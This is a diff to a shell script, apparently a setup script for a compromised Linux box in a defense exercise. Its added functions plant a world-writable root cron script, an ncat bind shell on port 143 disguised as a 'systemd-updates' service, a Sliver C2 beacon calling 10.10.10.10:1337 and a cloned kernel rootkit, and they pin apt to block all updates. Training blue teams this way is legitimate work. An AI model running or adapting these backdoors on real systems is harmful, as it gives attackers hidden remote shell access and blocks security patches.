@@ -164,4 +164,65 @@ pamPermit() {
   cp -f $pam_path/pam_permit.so $pam_path/pam_deny.so
 }
 
+#################
+#   PROCESSES   #
+#################
+
+# root runs a writeable script 
+cronScript() {
+  mkdir -p /home/jolyne/Documents
+  echo "tar czvf jolyne_docs.tar.gz /home/jolyne/Documents/" > /home/jolyne/backup.sh
+  chmod 777 /home/jolyne/backup.sh
+  echo "* * * * * /home/jolyne/backsup.sh" | crontab -
+}
+
+# nc bind shell: "systemd-updates" spoof + malicious service on port 143
+revShell() {
+  apt install ncat -y
+  cp $(which ncat) /usr/bin/systemd-updates
+  
+  cat <<EOF > /usr/lib/systemd/system/systemd-updates.service
+[Unit]
+Description=Unattended System Updates
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/systemd-updates -lvnp 143 -e /bin/bash
+ExecReload=/bin/kill -TERM $MAINPID
+Type=simple
+Restart=on-failure
+RestartSec=2
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=default.target
+EOF
+
+  systemctl daemon-reload
+  systemctl restart systemd-updates
+}
+
+# kool_beacons.sh was created with the following command:
+# generate beacon --mtls 10.10.10.10:1337 --os linux --arch amd64 --format shell --save . --seconds 5 --jitter 1 --name kool_beacon.sh
+sliver() {
+  ../assets/kool_beans.sh
+}
+
+aptPin() {
+cat <<EOF > /etc/apt/preferences.d/ubuntu-pro-esm-security
+Package: *
+Pin: release *
+Pin-Priority: -1
+EOF
+
+chattr +i /etc/apt/preferences.d/ubuntu-pro-esm-security
+}
+
+bdsRootkit() {
+  git clone https://github.com/bluedragonsecurity/bds_lkm.git
+  cd bds_lkm && ./install.sh
+}
+
+
 $1
